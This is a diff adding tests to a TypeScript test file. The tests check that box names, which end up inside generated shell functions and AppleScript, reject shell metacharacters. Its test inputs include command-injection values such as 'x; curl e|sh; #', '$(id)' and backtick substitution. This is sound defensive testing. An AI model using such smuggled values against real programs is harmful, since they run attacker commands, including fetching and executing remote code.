@@ -9,7 +9,13 @@ import { describe, expect, test } from 'bun:test';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { configsDir, listBoxes, resolveBox } from '../src/utils/config.js';
+import {
+  assertSafeBoxName,
+  configsDir,
+  isSafeBoxName,
+  listBoxes,
+  resolveBox,
+} from '../src/utils/config.js';
 
 /** Make a tmp configs dir seeded with the given filenames. */
 function seedConfigs(files: string[]): string {
@@ -193,6 +199,52 @@ describe('resolveBox (path form)', () => {
       expect(() => resolveBox(path.join(dir, '_presets'))).toThrow(/not found/);
       // …but pointing at the file itself is explicit intent (like --config)
       expect(resolveBox(path.join(dir, '_presets.mjs'))).toBe(path.join(dir, '_presets.mjs'));
+    } finally {
+      fs.rmSync(dir, { recursive: true, force: true });
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Box names end up inside generated code
+//
+// `init` interpolates a box name into a `clabox-<name>()` shell function and
+// into the `zsh -lic '… -b <name>'` command baked into a Ghostty app; `tab`
+// puts it in an AppleScript surface command. Once box configs can come from a
+// repo, the *filename* is attacker-chosen — so a name that isn't a plain
+// identifier is not a box.
+// ---------------------------------------------------------------------------
+
+describe('box name charset', () => {
+  test('ordinary names pass', () => {
+    for (const n of ['ax', 'ax-mg', 'ax_2', 'ax.work', 'A1']) {
+      expect(isSafeBoxName(n)).toBe(true);
+      expect(assertSafeBoxName(n)).toBe(n);
+    }
+  });
+
+  test('shell metacharacters, paths and odd leading chars are refused', () => {
+    for (const n of ['x; curl e|sh; #', 'a b', '$(id)', '`id`', 'a/b', '-rf', '.hidden', '']) {
+      expect(isSafeBoxName(n)).toBe(false);
+      expect(() => assertSafeBoxName(n)).toThrow(/unsafe box name/);
+    }
+  });
+
+  test('listBoxes skips a config whose filename is not a usable box name', () => {
+    const dir = seedConfigs(['ax.mjs', 'x; curl e|sh; #.mjs', 'a b.config.mjs']);
+    try {
+      // The hostile files are still on disk — they are simply not boxes, so
+      // `init` never writes a wrapper for them and `-b` never resolves them.
+      expect(listBoxes(dir)).toEqual(['ax']);
+    } finally {
+      fs.rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('resolveBox refuses such a name by itself', () => {
+    const dir = seedConfigs(['ax.mjs']);
+    try {
+      expect(() => resolveBox('x; id #', dir)).toThrow(/unsafe box name/);
     } finally {
       fs.rmSync(dir, { recursive: true, force: true });
     }
